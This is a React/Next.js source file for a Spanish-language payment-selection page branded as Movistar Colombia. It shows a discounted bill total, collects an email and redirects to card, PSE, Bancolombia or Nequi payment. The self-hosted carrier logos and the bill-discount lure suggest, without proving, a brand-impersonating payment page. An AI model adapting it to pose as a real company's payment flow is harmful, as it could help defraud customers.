"use client";

import { useState } from "react";
import { calcularDescuento } from "@/lib/discount";

function formatCOP(n: number): string {
  return n.toLocaleString("es-CO", { style: "currency", currency: "COP", minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

type Props = {
  total: number;
  descuentoPorcentaje: number;
  tarjetaEnabled: boolean;
  pseEnabled: boolean;
  bancolombiaEnabled: boolean;
  nequiEnabled: boolean;
};

export default function SeleccionarPagoClient(props: Props) {
  const [email, setEmail] = useState("");
  const [emailValid, setEmailValid] = useState(false);
  const [loading, setLoading] = useState(false);

  function validateEmail(v: string) {
    setEmail(v);
    setEmailValid(/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v));
  }

  async function submitPayment(method: "TARJETA" | "PSE" | "BANCOLOMBIA" | "NEQUI") {
    if (!emailValid) {
      alert("Por favor ingrese un correo electrónico válido");
      return;
    }
    setLoading(true);
    try {
      const r = await fetch("/api/pago/metodo", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, metodoPago: method }),
      });
      const data = (await r.json().catch(() => null)) as
        | { ok?: boolean; redirect?: string; errors?: Record<string, string> }
        | null;
      if (r.ok && data?.ok && data.redirect) {
        window.location.href = data.redirect;
        return;
      }
      if (data?.redirect) {
        window.location.href = data.redirect;
        return;
      }
      alert(
        data?.errors?.email ||
          data?.errors?.form ||
          "Error al procesar la solicitud."
      );
      setLoading(false);
    } catch (e) {
      console.error(e);
      alert("Error de conexión. Intente nuevamente.");
      setLoading(false);
    }
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <img src="/movistar/M.gif" alt="Cargando" className="w-48" />
      </div>
    );
  }

  const totalConDescuento = calcularDescuento(props.total, props.descuentoPorcentaje);
  const tieneDescuento = props.descuentoPorcentaje > 0;

  const btnClass = (enabled: boolean) =>
    "w-full flex items-center p-3 mb-3 rounded-md transition-colors " +
    (enabled
      ? "hover:bg-blue-50 text-[#029cf5] border border-black"
      : "bg-gray-100 text-gray-400 cursor-not-allowed");

  return (
    <div className="mainContainer">
      <section className="modal-container max-w-full mx-auto">
        <section className="modal">
          <header className="bg-black text-white pb-4 pt-2">
            <div className="flex justify-between items-center px-2 pt-2">
              <div className="flex items-center">
                <div className="logo-container bg-white rounded-full p-1 mr-3 w-14 h-14 flex items-center justify-center">
                  <img src="/movistar/1.jpg" alt="Logo" className="h-8" />
                </div>
                <div>
                  <h1 className="text-sm font-semibold">
                    Colombia Telecomunicaciones S.A. ESP
                  </h1>
                  <p className="text-sm text-gray-300">
                    Pago multiples facturas Movistar
                  </p>
                  <strong className="text-sm">
                    {tieneDescuento ? (
                      <>
                        <span className="line-through text-gray-400 mr-2">{formatCOP(props.total)}</span>
                        {formatCOP(totalConDescuento)}
                        <span className="text-xs text-green-300 ml-2">-{props.descuentoPorcentaje}%</span>
                      </>
                    ) : (
                      <>{formatCOP(props.total)} <span className="text-sm">COP</span></>
                    )}
                  </strong>
                </div>
              </div>
            </div>
            <div className="px-4 mt-4 text-center pt-3 border-t border-gray-100/50">
              <h3 className="text-sm">Ingrese su correo electrónico para iniciar</h3>
            </div>
          </header>

          <section className="content p-4 pb-24">
            <div className="step step-1 step-methods active">
              <div className="mb-6">
                <div className="flex justify-between border-b border-gray-300 pb-1">
                  <label
                    htmlFor="first-email"
                    className="flex items-center w-[30%] cursor-pointer"
                  >
                    <svg
                      className="w-4 h-4 text-black"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                    >
                      <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
                      <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
                    </svg>
                    <span className="text-sm font-semibold text-black ml-1">Email</span>
                  </label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => validateEmail(e.target.value)}
                    id="first-email"
                    placeholder="your@email.com"
                    className="w-[70%] py-2 focus:outline-none placeholder:text-sm placeholder:opacity-50 bg-transparent"
                  />
                </div>
              </div>

              <div className="button-container">
                <p className="text-gray-700 mb-4 text-sm">Seleccione el medio de pago</p>

                {props.tarjetaEnabled && (
                  <button
                    type="button"
                    onClick={() => submitPayment("TARJETA")}
                    disabled={!emailValid}
                    className={btnClass(emailValid) + " text-sm"}
                  >
                    <svg
                      className="w-5 h-5 mr-3 text-black"
                      fill="currentColor"
                      viewBox="0 0 576 512"
                    >
                      <path d="M0 432c0 26.5 21.5 48 48 48h480c26.5 0 48-21.5 48-48V256H0v176zm192-68c0-6.6 5.4-12 12-12h136c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12H204c-6.6 0-12-5.4-12-12v-40zm-128 0c0-6.6 5.4-12 12-12h72c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12H76c-6.6 0-12-5.4-12-12v-40zM576 80v48H0V80c0-26.5 21.5-48 48-48h480c26.5 0 48 21.5 48 48z" />
                    </svg>
                    Tarjeta de Crédito y Débito
                  </button>
                )}

                {props.pseEnabled && (
                  <button
                    type="button"
                    onClick={() => submitPayment("PSE")}
                    disabled={!emailValid}
                    className={btnClass(emailValid)}
                  >
                    <div className="mr-3">
                      <img src="/movistar/FORMA_PAGO_1.png" alt="PSE" className="h-6" />
                    </div>
                    <div className="text-left text-sm">
                      <div>Cuenta de Ahorros y Corriente</div>
                      <div className="text-xs text-gray-500 flex">
                        Acepta:
                        <img
                          src="/movistar/4.svg"
                          alt="daviplata"
                          className={
                            "ml-1 w-[30px] transition-colors " +
                            (!emailValid ? "filter grayscale" : "")
                          }
                        />
                        <img
                          src="/movistar/5.svg"
                          alt="nequi"
                          className={
                            "ml-1 mr-1 w-[30px] transition-colors " +
                            (!emailValid ? "filter grayscale" : "")
                          }
                        />
                        y más.
                      </div>
                    </div>
                  </button>
                )}

                {props.bancolombiaEnabled && (
                  <button
                    type="button"
                    onClick={() => submitPayment("BANCOLOMBIA")}
                    disabled={!emailValid}
                    className={btnClass(emailValid)}
                  >
                    <img
                      src="/movistar/FORMA_PAGO_18.png"
                      alt="Bancolombia"
                      className="h-6 mr-3 text-sm"
                    />
                    Bancolombia
                  </button>
                )}

                {props.nequiEnabled && (
                  <button
                    type="button"
                    onClick={() => submitPayment("NEQUI")}
                    disabled={!emailValid}
                    className={btnClass(emailValid) + " hover:bg-purple-50"}
                  >
                    <img
                      src="/movistar/5.svg"
                      alt="Nequi"
                      className="h-6 mr-3 text-sm"
                    />
                    Nequi
                  </button>
                )}
              </div>
            </div>
          </section>
        </section>
      </section>

      <footer className="fixed bottom-0 left-0 right-0 bg-white p-4 border-t border-gray-200">
        <div className="brand-footer text-center">
          <p className="text-xs text-gray-600 flex items-center justify-center">
            <svg className="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 448 512">
              <path d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z" />
            </svg>
            Pago seguro por
            <img src="/movistar/30.png" alt="ePayco Logo" className="h-4 ml-1" />
          </p>
        </div>
      </footer>
    </div>
  );
}
